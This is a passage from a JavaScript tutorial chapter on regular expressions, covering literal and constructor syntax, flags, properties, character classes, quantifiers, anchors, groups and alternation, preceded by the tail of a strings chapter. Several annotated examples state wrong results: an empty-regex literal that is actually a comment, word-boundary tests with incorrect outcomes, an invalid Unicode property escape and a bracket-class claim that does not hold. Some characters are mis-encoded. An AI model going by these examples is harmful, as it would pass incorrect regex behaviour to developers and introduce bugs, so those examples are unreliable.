6. **Cache formatters** (NumberFormat, DateTimeFormat, etc.)
7. **Handle platform variations** gracefully
8. **Avoid manual implementations** of complex i18n logic

**Common Patterns:**

```javascript
// Pattern 1: Locale-aware sorting
let collator = new Intl.Collator(userLocale);
items.sort(collator.compare);

// Pattern 2: Normalized comparison
s1.normalize('NFC').localeCompare(s2.normalize('NFC'), userLocale);

// Pattern 3: Case conversion
str.toLocaleUpperCase(userLocale);
str.toLocaleLowerCase(userLocale);

// Pattern 4: Fuzzy matching (ignore accents)
let collator = new Intl.Collator(userLocale, { sensitivity: 'base' });
collator.compare(str.toLowerCase(), pattern.toLowerCase()) === 0;

// Pattern 5: Search with locale awareness
let collator = new Intl.Collator(userLocale, { sensitivity: 'base' });
results.filter(item => collator.compare(item.name, query) === 0);
```

## 8.5 Strings Summary

| Category | Methods |
|----------|---------|
| **Search** | `indexOf`, `includes`, `startsWith`, `endsWith`, `search` |
| **Extract** | `slice`, `substring`, `charAt`, `at` |
| **Transform** | `toUpperCase`, `toLowerCase`, `trim`, `padStart`, `padEnd` |
| **Split/Join** | `split`, `repeat` |
| **Replace** | `replace`, `replaceAll` |

---

**End of Chapter 8: Strings**


# 09-RegExp.md

# 9 Regular Expressions

Regular expressions are patterns for matching text. JavaScript provides the `RegExp` object and regex literals for powerful string pattern matching.

---

## 9.1 RegExp Basics

**Regular Expressions** are patterns used to match, search, and manipulate strings. They provide powerful pattern matching capabilities essential for text processing.

---

### 9.1.1 Literal Syntax

**Literal syntax** uses forward slashes to define regex patterns directly in code.

```javascript
// Basic literal pattern
let regex = /hello/;
typeof regex;                    // 'object'
regex instanceof RegExp;         // true

// Test method - returns boolean
regex.test('hello world');       // true
regex.test('HELLO');             // false (case-sensitive by default)

// Match exact string
let pattern = /cat/;
pattern.test('cat');             // true
pattern.test('catch');           // true (contains 'cat')
pattern.test('dog');             // false

// Special characters need escaping
let decimal = /\./;              // Match literal dot (. is special)
decimal.test('3.14');            // true
decimal.test('314');             // false

// Multiple escape sequences
let regex2 = /\d\d\d-\d\d\d\d/;  // Pattern: ###-####
regex2.test('555-1234');         // true

// Empty regex (matches everything)
let empty = //;
empty.test('anything');          // true

// Complex pattern
let email = /@/;                 // Simple: contains @
email.test('user@example.com');  // true

// Literal regex is immutable
let r1 = /pattern/;
r1.source;                       // 'pattern'
r1.flags;                        // '' (no flags)

// Each literal creates new object
let r2 = /pattern/;
let r3 = /pattern/;
r2 === r3;                       // false (different objects)
r2.source === r3.source;         // true (same pattern)
```

**Syntax Limitations of Literals:**

```javascript
// âœ“ Works with literal
let regex = /[a-z]+/;

// âœ— Cannot use variables in literal
let digit = 'd';
let badRegex = /\${digit}/;      // Literal: matches "${digit}"

// Must use variables â†’ Constructor syntax needed
```

---

### 9.1.2 Constructor Syntax

**Constructor syntax** uses `new RegExp()` to create patterns with dynamic values.

```javascript
// Basic constructor
let regex = new RegExp('hello');
typeof regex;                    // 'object'
regex instanceof RegExp;         // true

// Equivalent to literal
/hello/.source === new RegExp('hello').source;  // true

// Constructor with flags (second parameter)
let caseInsensitive = new RegExp('hello', 'i');
caseInsensitive.test('HELLO');   // true

// Dynamic pattern using variables
let word = 'javascript';
let regex2 = new RegExp(word);
regex2.test('javascript');       // true
regex2.test('python');           // false

// Build pattern from user input
function buildPhoneRegex(format) {
  // format: "###-###-####"
  let pattern = format
    .replace(/#/g, '\\d')        // Replace # with \d
    .replace(/[()]/g, '\\$&');   // Escape parentheses
  return new RegExp('^' + pattern + '$');
}

let phoneRegex = buildPhoneRegex('(###) ###-####');
phoneRegex.test('(555) 123-4567');  // true

// Escape special regex characters
function escapeRegex(str) {
  return str.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
}

let literal = escapeRegex('example.com?');
// Returns: 'example\\.com\\?'
let regex3 = new RegExp(literal);
regex3.test('example.com?');     // true (literal match)

// String patterns vs literal escaping
new RegExp('\\d').test('5');     // true (\\d becomes \d)
/\d/.test('5');                  // true (literal \d)

// Double escaping in constructor
new RegExp('\\\\');              // Matches single backslash
/\\/;                            // Matches single backslash
// Constructor uses string escaping first, then regex interpretation

// Complex pattern with constructor
let domainPattern = new RegExp(
  '^' +                          // Start of string
  '[a-zA-Z0-9]+' +              // Domain name
  '\\.' +                        // Literal dot
  '[a-zA-Z]{2,}' +              // TLD
  '$'                            // End of string
);

domainPattern.test('example.com');   // true
domainPattern.test('example.c');     // false (TLD too short)

// Combining literals or dynamic patterns
function buildSearchPattern(keywords, caseSensitive = true) {
  let pattern = keywords.join('|');  // OR alternatives
  let flags = caseSensitive ? '' : 'i';
  return new RegExp(pattern, flags);
}

let search = buildSearchPattern(['cat', 'dog', 'bird']);
search.test('I have a cat');     // true

// Constructor with empty pattern
let empty = new RegExp('');
empty.test('');                  // true
empty.test('anything');          // true (empty matches everything)

// When to use literal vs constructor
// Literal: Known pattern at compile time
let knownPattern = /\d{3}-\d{3}-\d{4}/;

// Constructor: Dynamic pattern at runtime
let pattern = inputFromUser;
let dynamicRegex = new RegExp(pattern, 'i');

// Getting pattern information
let regex4 = /hello/gi;
regex4.source;                   // 'hello'
regex4.flags;                    // 'gi'
regex4.global;                   // true
regex4.ignoreCase;               // true
regex4.multiline;                // false

// Creating copy with different flags
let original = /pattern/;
let caseInsensitiveCopy = new RegExp(original.source, original.flags + 'i');
```

---

### 9.1.3 Flags

**Flags** modify how the regex behaves when matching.

```javascript
// Global flag (g) - find all matches
let globalRegex = /o/g;
let text = 'foo bar boo';
let matches = text.match(globalRegex);
matches;                         // ['o', 'o', 'o']

// Without g flag - only first match
let firstOnly = /o/;
text.match(firstOnly);           // ['o'] (only first)

// Case-insensitive flag (i)
let caseInsensitive = /hello/i;
caseInsensitive.test('HELLO');   // true
caseInsensitive.test('Hello');   // true
caseInsensitive.test('hello');   // true

// Multiline flag (m) - affects ^ and $
let multiline = /^test/m;
let lines = 'line1\ntest\nline3';
multiline.test(lines);           // true (^ matches line start in multiline)

// Without multiline flag
let singleline = /^test/;
singleline.test(lines);          // false (^ only matches string start)

// dotAll flag (s) - . matches newlines
let dotAll = /a.b/s;
dotAll.test('a\nb');             // true (. matches newline)

// Without s flag
let noDotAll = /a.b/;
noDotAll.test('a\nb');           // false (. doesn't match newline)

// Unicode flag (u) - proper Unicode support
let unicode = /./u;
let emoji = 'ðŸ˜€';
emoji.match(unicode);            // ['ðŸ˜€'] (correctly matches emoji)

// Without u flag (treats emoji as 2 code units)
let noUnicode = /./;
emoji.match(noUnicode);          // ['?'] (only first code unit)

// Sticky flag (y) - match from lastIndex position
let sticky = /\d+/y;
sticky.lastIndex = 3;
'ab12cd'.match(sticky);          // null (no match at position 3)

sticky.lastIndex = 2;
'ab12cd'.match(sticky);          // ['12'] (matches at position 2)

// Global vs Sticky
// 'g': find any matches anywhere
// 'y': find match starting at lastIndex
// 'gy': find matches from lastIndex onwards

// Indices flag (d) - capture match indices (ES2022)
let indices = /\w+/gd;
'hello world'.match(indices);
// Results include indices property with [start, end] positions

// Combining flags
let combined = /pattern/igm;     // Case-insensitive, global, multiline
combined.flags;                  // 'gim'

// Getting individual flags
let regex = /test/gim;
regex.global;                    // true
regex.ignoreCase;                // true
regex.multiline;                 // true
regex.dotAll;                    // false
regex.unicode;                   // false
regex.sticky;                    // false
regex.hasIndices;                // false

// Creating regex with flags
new RegExp('pattern', 'gi');     // Global + case-insensitive
new RegExp('pattern', 'gim');    // Global + case-insensitive + multiline
new RegExp('pattern', 'giu');    // Global + case-insensitive + Unicode

// Flags affect behavior significantly
let text1 = 'Hello\nworld';

// Single-line (default ^/$ match string boundaries)
/^world/.test(text1);            // false

// Multiline (^/$ match line boundaries)
/^world/m.test(text1);           // true

// Case-sensitive (default)
/hello/.test(text1);             // false

// Case-insensitive
/hello/i.test(text1);            // true

// Real-world: regex with all flags
function validateInput(pattern, input, flags = 'i') {
  // flags: 'i' for case-insensitive, 'g' for global, etc.
  let regex = new RegExp(pattern, flags);
  return regex.test(input);
}

validateInput('hello', 'HELLO');  // true (default 'i' flag)
validateInput('hello', 'HELLO', 'g');  // true (with 'g')
validateInput('hello', 'hello');  // true

// Performance note: global regex with lastIndex
let globalRegex2 = /\d+/g;
globalRegex2.exec('a1b2c3');
// After exec, lastIndex is updated for next search
globalRegex2.lastIndex;          // 2 (position after match)
globalRegex2.exec('a1b2c3');
// Next exec continues from lastIndex
// This is useful for finding all matches in sequence
```

**Flag Summary Table:**

| Flag | Name | Effect | Example |
|------|------|--------|---------|
| `g` | Global | Find all matches | `/.../g` finds multiple |
| `i` | Case-insensitive | Ignore case | `/hello/i` matches "HELLO" |
| `m` | Multiline | `^`/`$` match lines | `/^text/m` matches after newline |
| `s` | Dotall | `.` matches newline | `/a.b/s` matches "a\nb" |
| `u` | Unicode | Proper Unicode | `/./u` correctly handles emoji |
| `y` | Sticky | Match from lastIndex | `/\d+/y` from specific position |
| `d` | Indices | Include match indices | `/\d+/d` returns positions (ES2022) |

---

### 9.1.4 RegExp Properties

**Properties** provide information about regex objects.

```javascript
// source property - get pattern string
let regex = /hello/i;
regex.source;                    // 'hello' (not the flags)

// flags property - get all flags
regex.flags;                     // 'i'

let regex2 = /test/gim;
regex2.flags;                    // 'gim'

// Individual flag properties
let regex3 = /pattern/gi;
regex3.global;                   // true
regex3.ignoreCase;               // true
regex3.multiline;                // false
regex3.dotAll;                   // false
regex3.unicode;                  // false
regex3.sticky;                   // false
regex3.hasIndices;               // false

// lastIndex - position of next match (with g/y flags)
let globalRegex = /\d/g;
globalRegex.lastIndex;           // 0 (initial)

globalRegex.exec('a1b2c3');      // ['1']
globalRegex.lastIndex;           // 2 (after first match)

globalRegex.exec('a1b2c3');      // ['2']
globalRegex.lastIndex;           // 4 (after second match)

// Resetting lastIndex for re-executing
globalRegex.lastIndex = 0;       // Reset
globalRegex.exec('a1b2c3');      // ['1'] (starts from beginning)

// lastIndex with sticky flag
let sticky = /\d/y;
sticky.lastIndex = 0;
sticky.exec('a1b2c3');           // null (no digit at position 0)

sticky.lastIndex = 1;
sticky.exec('a1b2c3');           // ['1'] (digit at position 1)

// lastIndex is not reset automatically with test()
let regex4 = /\d/g;
regex4.test('1a2b3');            // true
regex4.lastIndex;                // 1

regex4.test('1a2b3');            // true (continues from lastIndex)
regex4.lastIndex;                // 3

regex4.test('1a2b3');            // false (no more digits)
regex4.lastIndex;                // 0 (reset when match fails)

// Getting all regex info
function regexInfo(regex) {
  return {
    source: regex.source,
    flags: regex.flags,
    global: regex.global,
    ignoreCase: regex.ignoreCase,
    multiline: regex.multiline,
    dotAll: regex.dotAll,
    unicode: regex.unicode,
    sticky: regex.sticky,
    hasIndices: regex.hasIndices,
    lastIndex: regex.lastIndex
  };
}

regexInfo(/hello/gi);
// Returns all properties in one object

// Regex equality comparison
let r1 = /pattern/i;
let r2 = /pattern/i;
r1 === r2;                       // false (different objects)

// Compare patterns and flags
function regexEqual(r1, r2) {
  return r1.source === r2.source && r1.flags === r2.flags;
}

regexEqual(/pattern/i, /pattern/i);  // true

// Common pattern: check flag status
function isGlobal(regex) {
  return regex.global;
}

function isCaseInsensitive(regex) {
  return regex.ignoreCase;
}

// Creating copy with modified flags
function addFlag(regex, flag) {
  let newFlags = regex.flags;
  if (!newFlags.includes(flag)) {
    newFlags += flag;
  }
  return new RegExp(regex.source, newFlags);
}

let original = /test/;
let withGlobal = addFlag(original, 'g');
withGlobal.flags;                // 'g'

// Removing flags
function removeFlag(regex, flag) {
  let newFlags = regex.flags.replace(flag, '');
  return new RegExp(regex.source, newFlags);
}

let removeCase = removeFlag(/test/i, 'i');
removeCase.flags;                // ''
```

---

### 9.1.5 Creating Regex Dynamically

**Dynamic regex** construction enables pattern building at runtime.

```javascript
// Basic dynamic pattern
function searchFor(keyword) {
  return new RegExp(keyword, 'i');
}

let emailSearch = searchFor('email');
emailSearch.test('EMAIL');       // true

// Escaping dynamic input
function literalRegex(str) {
  let escaped = str.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
  return new RegExp(escaped);
}

let userInput = 'example.com?';
let regex = literalRegex(userInput);
regex.test('example.com?');      // true (matches literally)
regex.test('exampleXcom');       // false

// Building complex patterns
function rangePattern(from, to) {
  return new RegExp(`[${from}-${to}]`);
}

let lowercase = rangePattern('a', 'z');
lowercase.test('m');             // true
lowercase.test('5');             // false

// OR pattern from array
function anyOf(...words) {
  let pattern = words.map(w => w.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')).join('|');
  return new RegExp(pattern, 'i');
}

let colors = anyOf('red', 'blue', 'green');
colors.test('RED');              // true
colors.test('purple');           // false

// Building pattern with optional parts
function optionalPattern(required, optional = '') {
  let pattern = required + (optional ? `(${optional})?` : '');
  return new RegExp(pattern);
}

let areaCode = optionalPattern('\\d{3}', '[- ]?');
areaCode.test('123-4567');       // true
areaCode.test('1234567');        // true

// Quantifier patterns
function repeatPattern(char, min, max) {
  let quantifier = max ? `{${min},${max}}` : `{${min}}`;
  return new RegExp(char + quantifier);
}

let threeDigits = repeatPattern('\\d', 3);
threeDigits.test('123');         // true
threeDigits.test('12');          // false

// Conditional patterns
function emailRegex() {
  let localPart = '[a-zA-Z0-9._%-]+';
  let domain = '[a-zA-Z0-9.-]+';
  let tld = '[a-zA-Z]{2,}';
  let pattern = `^${localPart}@${domain}\\.${tld}$`;
  return new RegExp(pattern);
}

let emailReg = emailRegex();
emailReg.test('user@example.com');  // true

// Template-based patterns
function createMatcher(template) {
  // Replace placeholders with patterns
  let pattern = template
    .replace(/{NUMBER}/g, '\\d+')
    .replace(/{WORD}/g, '\\w+')
    .replace(/{LETTER}/g, '[a-z]')
    .replace(/{SPACE}/g, '\\s');
  return new RegExp(pattern, 'i');
}

let matcher = createMatcher('Name: {WORD}, Age: {NUMBER}');
matcher.test('Name: Alice, Age: 25');  // true

// Performance: compile frequently used patterns once
const COMMON_PATTERNS = {
  email: /^[^\s@]+@[^\s@]+\.[^\s@]+$/,
  url: /^https?:\/\/.+$/,
  phone: /^\d{3}-?\d{3}-?\d{4}$/,
  zipcode: /^\d{5}(-\d{4})?$/
};

COMMON_PATTERNS.email.test('user@example.com');  // true

// Memoization for expensive patterns
const patternCache = new Map();

function getCachedPattern(patternStr, flags = '') {
  const key = patternStr + flags;
  if (!patternCache.has(key)) {
    patternCache.set(key, new RegExp(patternStr, flags));
  }
  return patternCache.get(key);
}

getCachedPattern('\\d+', 'g');   // Creates and caches
getCachedPattern('\\d+', 'g');   // Returns cached version
```

---

## Summary: RegExp Basics

**Key Takeaways:**

1. **Literal syntax** (`/.../flags`) for compile-time patterns
2. **Constructor syntax** (`new RegExp()`) for dynamic patterns
3. **Flags modify behavior**: `g` (global), `i` (case-insensitive), `m` (multiline), `s` (dotall), `u` (Unicode), `y` (sticky), `d` (indices)
4. **Properties** include `source`, `flags`, individual flag properties, and `lastIndex`
5. **Dynamic patterns** enable runtime pattern construction with proper escaping

**When to Use Each:**
- **Literal**: Known patterns, slightly better performance
- **Constructor**: Dynamic patterns, user input, runtime configuration

**Common Patterns Reference:**
- Email: `/^[^\s@]+@[^\s@]+\.[^\s@]+$/`
- URL: `/^https?:\/\/.+$/`
- Phone: `/^\d{3}-?\d{3}-?\d{4}$/`
- Digits: `/\d+/g`
- Word: `/\w+/`
- Whitespace: `/\s+/`

**Best Practice:**
```javascript
// Cache frequently used patterns
const EMAIL = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
const DIGITS = /\d+/g;

// Use literal for static patterns
let result = EMAIL.test(input);

// Use constructor for dynamic patterns
let pattern = new RegExp(userInput, 'i');
```
## 9.2 Pattern Syntax

**Pattern syntax** defines the rules and notation used to specify what to match. Understanding patterns is fundamental to effective regex use.

---

### 9.2.1 Literal Characters and Escaping

**Literal characters** match exactly what they are unless they have special meaning.

```javascript
// Simple literal matches
/hello/.test('hello world');     // true
/hello/.test('Hello world');     // false (case-sensitive)

// Numbers as literals
/123/.test('abc123def');         // true

// Special characters need escaping
/./;                             // Matches any character
/\./;                            // Matches literal dot

// Escape sequences
let patterns = {
  dot: /\./,                     // Literal dot
  star: /\*/,                    // Literal asterisk
  plus: /\+/,                    // Literal plus
  question: /\?/,                // Literal question mark
  pipe: /\|/,                    // Literal pipe
  caret: /\^/,                   // Literal caret
  dollar: /\$/,                  // Literal dollar
  backslash: /\\/,               // Literal backslash
  bracket: /\[/,                 // Literal bracket
  paren: /\(/,                   // Literal parenthesis
  brace: /\{/                    // Literal brace
};

patterns.dot.test('3.14');       // true
patterns.dot.test('314');        // false

// Characters that don't need escaping (in most contexts)
/hello-world/.test('hello-world');   // true (hyphen safe outside char class)
/hello world/.test('hello world');   // true (space literal)
/hello_world/.test('hello_world');   // true (underscore literal)

// Escaping in strings for constructor
new RegExp('\\.');               // Matches literal dot
new RegExp('\\\\');              // Matches literal backslash
new RegExp('\\d');               // Matches digit (not literal d)

// Double escaping in constructor strings
let escapeInString = '\\d';      // String contains: \d
let regex = new RegExp(escapeInString);  // Matches any digit

// Numeric literals
/[0-9]/.test('5');               // true
/[0-9]/.test('a');               // false

// Word characters (alphanumeric + underscore)
/\w/.test('a');                  // true
/\w/.test('_');                  // true
/\w/.test('!');                  // false

// Whitespace characters
/\s/.test(' ');                  // true (space)
/\s/.test('\t');                 // true (tab)
/\s/.test('\n');                 // true (newline)
/\s/.test('a');                  // false

// Non-whitespace
/\S/.test('a');                  // true
/\S/.test(' ');                  // false
```

---

### 9.2.2 Character Classes

**Character classes** match any one character from a set.

```javascript
// Character class - any one character inside brackets
/[abc]/.test('a');               // true
/[abc]/.test('d');               // false
/[abc]/.test('abc');             // true (matches first 'a')

// Negated character class
/[^abc]/.test('d');              // true
/[^abc]/.test('a');              // false

// Range - characters between two values
/[a-z]/.test('m');               // true
/[a-z]/.test('M');               // false (case-sensitive)

// Multiple ranges
/[a-zA-Z]/.test('M');            // true
/[a-zA-Z]/.test('5');            // false

// Digit range
/[0-9]/.test('5');               // true
/[0-9]/.test('a');               // false

// Negated ranges
/[^0-9]/.test('a');              // true
/[^0-9]/.test('5');              // false

// Multiple characters and ranges
/[a-zA-Z0-9_]/.test('X');        // true (letter)
/[a-zA-Z0-9_]/.test('5');        // true (digit)
/[a-zA-Z0-9_]/.test('_');        // true (underscore)
/[a-zA-Z0-9_]/.test('!');        // false

// Special characters in class (usually don't need escaping)
/[!@#$%]/.test('@');             // true
/[.+*]/.test('+');               // true

// Hyphen must be escaped or positioned carefully
/[a-z]/.test('-');               // false (hyphen means range)
/[a-z-]/.test('-');              // true (hyphen at end)
/[-a-z]/.test('-');              // true (hyphen at start)
/[a\-z]/.test('-');              // true (escaped hyphen)

// Bracket needs escaping
/[]abc]/.test(']');              // true
/[abc\]]/.test(']');             // true

// Caret at start negates class
/[^abc]/.test('d');              // true (NOT a, b, or c)
/[^abc]/.test('a');              // false

// Caret not at start is literal
/[a^bc]/.test('^');              // true

// Common character classes
/[a-z]/.test('letter');          // true (lowercase)
/[A-Z]/.test('LETTER');          // true (uppercase)
/[0-9]/.test('123');             // true (digit)
/[0-9a-f]/.test('ff');           // true (hex digit)

// Combining multiple classes in pattern
/[0-9][a-z][A-Z]/.test('5aZ');   // true
/[0-9][a-z][A-Z]/.test('5a');    // false (need 3 chars)

// Negated complex classes
/[^a-zA-Z0-9]/.test('_');        // true (non-alphanumeric)
/[^a-zA-Z0-9]/.test('a');        // false (is alphanumeric)

// Unicode property escapes (modern)
/\p{Lowercase}/u.test('a');      // true
/\p{Uppercase}/u.test('A');      // true
/\p{Digit}/u.test('5');          // true

// Practical patterns
let lowercase = /[a-z]/;
let uppercase = /[A-Z]/;
let digit = /[0-9]/;
let alphanumeric = /[a-zA-Z0-9]/;
let hexDigit = /[0-9a-fA-F]/;
let specialChar = /[!@#$%^&*()]/;
```

---

### 9.2.3 Predefined Character Classes

**Predefined classes** are shorthand for common character sets.

```javascript
// Digit: [0-9]
/\d/.test('5');                  // true
/\d/.test('a');                  // false

// Non-digit: [^0-9]
/\D/.test('a');                  // true
/\D/.test('5');                  // false

// Word character: [a-zA-Z0-9_]
/\w/.test('a');                  // true
/\w/.test('_');                  // true
/\w/.test('5');                  // true
/\w/.test('!');                  // false

// Non-word character: [^a-zA-Z0-9_]
/\W/.test('!');                  // true
/\W/.test('a');                  // false

// Whitespace: [ \t\n\r\f\v]
/\s/.test(' ');                  // true (space)
/\s/.test('\t');                 // true (tab)
/\s/.test('\n');                 // true (newline)
/\s/.test('a');                  // false

// Non-whitespace: [^ \t\n\r\f\v]
/\S/.test('a');                  // true
/\S/.test(' ');                  // false

// Dot: any character except newline
/./.test('a');                   // true
/./.test('5');                   // true
/./.test('!');                   // true
/./.test('\n');                  // false

// Dot with dotAll flag (s): any character including newline
/./s.test('\n');                 // true

// Common combinations
/\d+/.test('123');               // true (one or more digits)
/\w+/.test('hello_world');       // true (word characters)
/\s+/.test('   ');               // true (whitespace)

// Mixed patterns
/\d\w\s/.test('5a ');            // true (digit, word char, whitespace)

// Negation patterns
/\D\D\D/.test('abc');            // true (3 non-digits)
/\D\D\D/.test('a5c');            // false (second is digit)

// Real-world examples
let phone = /\d{3}-\d{3}-\d{4}/; // Phone: ###-###-####
phone.test('555-123-4567');      // true

let slug = /^[a-z0-9-]+$/;       // Slugs: lowercase, numbers, hyphens
slug.test('my-slug-123');        // true
slug.test('My-Slug');            // false (uppercase)

let password = /^(?=.*\d)(?=.*[a-z])(?=.*[A-Z]).{8,}$/;
// Password: at least 8 chars with digit, lowercase, uppercase

let whitespaceNorm = /\s+/g;     // Normalize multiple spaces
'hello    world'.replace(whitespaceNorm, ' ');  // 'hello world'

// Unicode categories (with 'u' flag)
/\p{Letter}/u.test('A');         // true
/\p{Letter}/u.test('Î±');         // true (Greek)
/\p{Letter}/u.test('5');         // false

/\p{Number}/u.test('5');         // true
/\p{Number}/u.test('Ù¥');         // true (Arabic 5)

/\p{Punctuation}/u.test('.');    // true
/\p{Symbol}/u.test('â‚¬');         // true
```

---

### 9.2.4 Quantifiers

**Quantifiers** specify how many times to match.

```javascript
// Asterisk: 0 or more times
/a*/.test('');                   // true
/a*/.test('a');                  // true
/a*/.test('aaa');                // true

// Plus: 1 or more times
/a+/.test('');                   // false
/a+/.test('a');                  // true
/a+/.test('aaa');                // true

// Question mark: 0 or 1 time (optional)
/colou?r/.test('color');         // true
/colou?r/.test('colour');        // true
/colou?r/.test('coluur');        // false

// Exact count: {n}
/a{3}/.test('aa');               // false
/a{3}/.test('aaa');              // true
/a{3}/.test('aaaa');             // true (matches first 3)

// Minimum: {n,}
/a{2,}/.test('a');               // false
/a{2,}/.test('aa');              // true
/a{2,}/.test('aaa');             // true

// Range: {n,m}
/a{2,4}/.test('a');              // false
/a{2,4}/.test('aa');             // true
/a{2,4}/.test('aaa');            // true
/a{2,4}/.test('aaaa');           // true
/a{2,4}/.test('aaaaa');          // true (matches first 4)

// Common patterns
/\d{3}-\d{3}-\d{4}/.test('555-123-4567');  // Phone pattern
/[a-z]{2,4}/.test('go');         // 2-4 lowercase letters
/\w{8,}/.test('password123');    // 8+ word characters

// Greedy vs Non-greedy quantifiers
let greedy = /a+/;
'aaaa'.match(greedy);             // ['aaaa'] (matches all)

let nonGreedy = /a+?/;
'aaaa'.match(nonGreedy);          // ['a'] (matches minimum)

// Greedy by default with global
/\d+/g.exec('123 456 789');
// First match: '123' (all digits)

// Non-greedy with ?
/\d+?/g.exec('123 456');
// First match: '1' (minimum digits)

// HTML tag example (dangerous!)
/<.+>/.exec('<div>content</div>');
// ['<div>content</div>'] (greedy, matches too much!)

/<.+?>/.exec('<div>content</div>');
// ['<div>'] (non-greedy, matches tag)

// Combining quantifiers
/\d{3}-?\d{3}-?\d{4}/.test('555-1234');  // true (hyphen optional)
/\d{3}-?\d{3}-?\d{4}/.test('5551234');   // true

// Quantifier on groups (covered later)
/(ab){3}/.test('ababab');         // true
/(ab){3}/.test('ab');             // false

// Complex quantified patterns
let email = /[a-z0-9._%-]+@[a-z0-9.-]+\.[a-z]{2,}/i;
email.test('user@example.com');   // true

let url = /https?:\/\/[a-z0-9.-]+/i;
url.test('https://example.com');  // true
url.test('http://example.com');   // true

// Practical: flexible whitespace
/hello\s*world/.test('hello world');     // true
/hello\s*world/.test('hello    world');  // true
/hello\s*world/.test('helloworld');      // true

// Quantifier combinations
/a*b+c?d{2,}/;                   // 0+ 'a', 1+ 'b', 0-1 'c', 2+ 'd'
```

---

### 9.2.5 Anchors

**Anchors** match positions rather than characters.

```javascript
// Caret (^): start of string
/^hello/.test('hello world');     // true
/^hello/.test('say hello');       // false

// Dollar ($): end of string
/world$/.test('hello world');     // true
/world$/.test('world hello');     // false

// Both anchors: exact match
/^hello$/.test('hello');          // true
/^hello$/.test('hello world');    // false

// Multiline mode: ^ and $ match line boundaries
let text = 'line1\nline2\nline3';

/^line/.test(text);               // true (start of string)
/^line/m.test(text);              // true (start of string or line)

// Word boundary: \b
/\bworld\b/.test('hello world');  // true
/\bworld\b/.test('worldly');      // false

// Non-word boundary: \B
/\Bworld/.test('worldly');        // true (part of word)
/\Bworld/.test('hello world');    // false

// Practical patterns
let lineStart = /^hello/m;        // Start of any line
let lineEnd = /world$/m;          // End of any line
let exactMatch = /^hello$/;       // Entire string is 'hello'

// Finding whole words
let word = /\bword\b/;
word.test('word');                // true
word.test('words');               // false
word.test('sword');               // false

// Email-like: @ must not be at start/end
let email = /^[^@]+@[^@]+$/;
email.test('user@example.com');   // true
email.test('@example.com');       // false

// URL must start with protocol
let url = /^https?:\/\//;
url.test('https://example.com');  // true
url.test('example.com');          // false

// Line anchors in multiline
let lines = 'start\nmiddle\nend';
let endLines = /\w+$/gm;          // Each word at line end
lines.match(endLines);            // ['start', 'middle', 'end']

// Word boundary uses \w definition ([a-zA-Z0-9_])
/\b\d+\b/.test('123 abc');       // true
/\b\d+\b/.test('abc123');        // true
/\b\d+\b/.test('abc_123');       // false (_ connects them)

// Common anchor patterns
/^[a-z]/;                        // Start with lowercase
/[a-z]$/;                        // End with lowercase
/^\d{3}-\d{4}$/;                 // Exactly phone format
/^https?:\/\/\w+\.\w+$/;         // Basic URL validation

// Lookahead / Lookbehind (advanced, covered later)
/(?=@)/;                          // Positive lookahead
/(?!@)/;                          // Negative lookahead
/(?<=@)/;                         // Positive lookbehind
/(?<!@)/;                         // Negative lookbehind
```

---

### 9.2.6 Groups and Capture

**Groups** organize patterns and capture matched text.

```javascript
// Capturing group: parentheses ()
let regex = /(\d{3})-(\d{4})/;
let match = 'call 555-1234'.match(regex);
match[0];                        // '555-1234' (full match)
match[1];                        // '555' (first group)
match[2];                        // '1234' (second group)

// Multiple groups
let pattern = /(\w+)\s(\w+)/;
let text = 'John Doe';
let result = text.match(pattern);
result[1];                       // 'John'
result[2];                       // 'Doe'

// Non-capturing group: (?:...)
let nonCapture = /(?:cat|dog)/;
let match2 = nonCapture.exec('I have a cat');
match2[0];                       // 'cat'
match2[1];                       // undefined (no group)

// Capturing vs non-capturing
/(hello)/;                        // 1 group (captures)
/(?:hello)/;                      // 0 groups (non-capturing)

// Named groups: (?<name>...)
let namedPattern = /(?<year>\d{4})-(?<month>\d{2})-(?<day>\d{2})/;
let dateMatch = '2024-02-08'.match(namedPattern);
dateMatch.groups.year;           // '2024'
dateMatch.groups.month;          // '02'
dateMatch.groups.day;            // '08'

// Accessing named groups
let regex2 = /(?<first>\w+) (?<last>\w+)/;
let textMatch = 'Alice Bob'.match(regex2);
textMatch.groups;                // { first: 'Alice', last: 'Bob' }
textMatch.groups.first;          // 'Alice'

// Using groups in replacement
let phone = '5551234567';
phone.replace(/(\d{3})(\d{3})(\d{4})/, '($1) $2-$3');
// '(555) 123-4567'

// Using named groups in replacement
let date = '2024-02-08';
date.replace(
  /(?<year>\d{4})-(?<month>\d{2})-(?<day>\d{2})/,
  '$<day>/$<month>/$<year>'
);
// '08/02/2024'

// Groups with quantifiers
/(abc)+/.test('abcabcabc');      // true (repeat group)
/(abc)+/.exec('abcabcabc')[1];   // 'abc' (last occurrence)

// Nested groups
/((a)(b))/.exec('ab');
// ['ab', 'ab', 'a', 'b']
// Group 0: full match
// Group 1: outer group (ab)
// Group 2: inner group a
// Group 3: inner group b

// Optional groups
let pattern2 = /(\w+)(?:_(\w+))?/;
pattern2.exec('hello');          // ['hello', 'hello', undefined]
pattern2.exec('hello_world');    // ['hello_world', 'hello', 'world']

// Alternation with groups
/(cat|dog|bird)/.exec('I have a cat');
// ['cat', 'cat'] (group captures 'cat')

// Real-world: email extraction
let emailPattern = /([a-zA-Z0-9._%-]+)@([a-zA-Z0-9.-]+)/;
let email = emailPattern.exec('user@example.com');
email[1];                        // 'user'
email[2];                        // 'example.com'

// URL parsing
let urlPattern = /^(https?):\/\/([^\/]+)(\/.*)?$/;
let url = 'https://example.com/path/to/page';
let urlMatch = urlPattern.exec(url);
urlMatch[1];                     // 'https'
urlMatch[2];                     // 'example.com'
urlMatch[3];                     // '/path/to/page'

// Backreferences (matching repeated groups) - covered in 9.4
/(\w)\1/.test('hello');          // true (double letter 'l')
```

---

### 9.2.7 Alternation

**Alternation** matches one pattern or another.

```javascript
// Pipe (|): OR operator
/cat|dog/.test('I have a cat');  // true
/cat|dog/.test('I have a dog');  // true
/cat|dog/.test('I have a bird'); // false

// Multiple alternatives
/red|green|blue/.test('green');  // true

// Order matters (first match wins)
/cat|category/.test('category'); // true (matches 'cat' first)
/category|cat/.test('category'); // true (matches full 'category')

// Group alternations
/(cat|dog)/.exec('cat');         // ['cat', 'cat']
/(cat|dog)/.exec('dog');         // ['dog', 'dog']

// Complex alternations
let pattern = /\d{3}-\d{4}|\d{3}-\d{3}-\d{4}/;
pattern.test('555-1234');        // true
pattern.test('555-123-4567');    // true

// Alternation in groups
